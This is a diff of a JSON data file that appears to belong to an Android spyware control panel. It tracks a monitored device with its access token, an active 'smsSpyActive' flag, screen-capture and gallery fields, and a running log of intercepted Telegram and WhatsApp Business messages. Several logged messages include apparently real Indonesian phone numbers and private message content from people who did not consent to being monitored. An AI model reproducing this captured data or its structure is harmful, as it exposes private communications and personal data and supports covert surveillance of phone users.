@@ -311,7 +311,7 @@
     "deviceName": "HP-SAYANG-4049",
     "ownerUsername": "GANANG",
     "token": "a70009f8a5d81c6b767372cdc0d6c979",
-    "lastSeen": 1775632816346,
+    "lastSeen": 1775632834237,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-08T06:28:11.035Z",
@@ -327,6 +327,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "Telegram",
+        "sender": "STORE Reski",
+        "content": "Uy",
+        "time": "08/04 14:20",
+        "pkg": "org.telegram.messenger.web",
+        "receivedAt": 1775632835876
+      },
+      {
+        "appName": "Telegram",
+        "sender": "STORE Reski",
+        "content": "Uy",
+        "time": "08/04 14:20",
+        "pkg": "org.telegram.messenger.web",
+        "receivedAt": 1775632835501
+      },
       {
         "appName": "WA Business",
         "sender": "+62 815-2386-4283",
@@ -4310,22 +4326,6 @@
         "time": "08/04 13:52",
         "pkg": "com.whatsapp.w4b",
         "receivedAt": 1775631174429
-      },
-      {
-        "appName": "WA Business",
-        "sender": "+62 851-2302-5715",
-        "content": ".",
-        "time": "08/04 13:52",
-        "pkg": "com.whatsapp.w4b",
-        "receivedAt": 1775631174417
-      },
-      {
-        "appName": "WA Business",
-        "sender": "+62 851-2302-5715",
-        "content": "Tapi sekarang gw ga main gituan si",
-        "time": "08/04 13:52",
-        "pkg": "com.whatsapp.w4b",
-        "receivedAt": 1775631162298
       }
     ],
     "galleryPhotos": [],
